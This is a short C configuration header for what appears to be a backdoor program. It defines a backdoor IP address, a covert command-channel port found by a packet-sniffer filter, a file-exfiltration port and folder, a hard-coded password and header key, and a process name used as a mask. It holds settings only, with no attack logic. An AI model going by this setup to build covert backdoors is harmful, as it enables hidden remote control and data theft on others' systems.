#ifndef CONFIG_H
#define CONFIG_H

#define STR_HELPER(x) #x
#define STR(x) STR_HELPER(x)

#define NIC_NAME "wlan0"
#define BACKDOOR_IP "192.168.1.70"
#define CMD_CHANNEL_PORT 383
#define FILE_EXFILT_PORT 8080
#define EXFILT_FOLDER_PATH "./"
#define HEADER_KEY "noob"
#define PASSWORD "password"

#define SNIFFER_FILTER "src host " BACKDOOR_IP " and dst port " STR(CMD_CHANNEL_PORT)

#define MASK_NAME "hello"

#endif
